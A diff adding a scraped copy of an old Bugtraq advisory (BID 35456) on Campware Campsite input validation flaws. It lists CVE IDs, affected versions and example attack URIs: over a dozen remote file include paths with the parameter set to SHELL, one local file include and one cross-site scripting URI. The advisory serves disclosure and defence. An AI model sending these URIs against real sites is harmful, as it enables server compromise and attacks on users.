@@ -1,0 +1,107 @@
+#SpeeDr00t@Black Falcon<br>#bid35456<p><b><span style="font-size: 18pt;">RETIRED: Campsite Multiple Remote Input Validation Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/35456/info">info</a><br><a href="http://www.securityfocus.com/bid/35456/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/35456/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/35456/solution">solution</a><br><a href="http://www.securityfocus.com/bid/35456/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				35456
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2009-2181<br/>
+				
+					CVE-2009-2182<br/>
+				
+					CVE-2009-2183<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jun 22 2009 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Aug 21 2009 03:57PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				CraCkEr
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Campware Campsite 2.6.2 <br/>
+					
+				
+					Campware Campsite 2.6.1 <br/>
+					
+				
+					Campware Campsite  3.3.0 RC1<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An attacker can exploit these issues via a browser. To exploit the cross-site scripting issue, the attacker must entice a user to follow a malicious link.<br/><br/>The following example URIs are available:<br/><br/>Remote file include:<br/><br/>http://www.example.com/path/implementation/site/admin-files/ad_popup.php?GLOBALSg_campsiteDir=SHELL<br/>http://www.example.com/path/implementation/site/admin-files/camp_html.php?GLOBALSg_campsiteDir=SHELL<br/>http://www.example.com/path/implementation/site/admin-files/init_content.php?GLOBALSg_campsiteDir=SHELL<br/>http://www.example.com/path/implementation/site/admin-files/logout.php?GLOBALSg_campsiteDir=SHELL<br/>http://www.example.com/path/implementation/site/admin-files/menu.php?GLOBALSg_campsiteDir=SHELL<br/>http://www.example.com/path/implementation/site/admin-files/set-author.php?GLOBALSg_campsiteDir=SHELL<br/>http://www.example.com/path/implementation/site/conf/liveuser_configuration.php?GLOBALSg_campsiteDir=SHELL<br/>http://www.example.com/path/implementation/site/include/phorum_load.php?GLOBALSg_campsiteDir=SHELL<br/>http://www.example.com/path/implementation/site/admin-files/article_import/CommandProcessor.php?GLOBALSg_campsiteDir=SHELL<br/>http://www.example.com/path/implementation/site/admin-files/article_import/index.php?GLOBALSg_campsiteDir=SHELL<br/>http://www.example.com/path/implementation/site/admin-files/articles/add.php?GLOBALSg_campsiteDir=SHELL<br/>http://www.example.com/path/implementation/site/admin-files/articles/add_move.php?GLOBALSg_campsiteDir=SHELL<br/>http://www.example.com/path/implementation/site/admin-files/articles/autopublish.php?GLOBALSg_campsiteDir=SHELL<br/>http://www.example.com/path/implementation/site/admin-files/articles/autopublish_del.php?GLOBALSg_campsiteDir=SHELL<br/><br/>Local file include:<br/><br/>http://www.example.com/path/implementation/site/admin-files/ad.php?GLOBALSg_campsiteDir=LFI<br/><br/>Cross-site scripting:<br/><br/>http://www.example.com/path/implementation/site/admin-files/templates/list_dir.php?listbasedir=XSS
+	
+		<ul>
+</ul>
+</div>
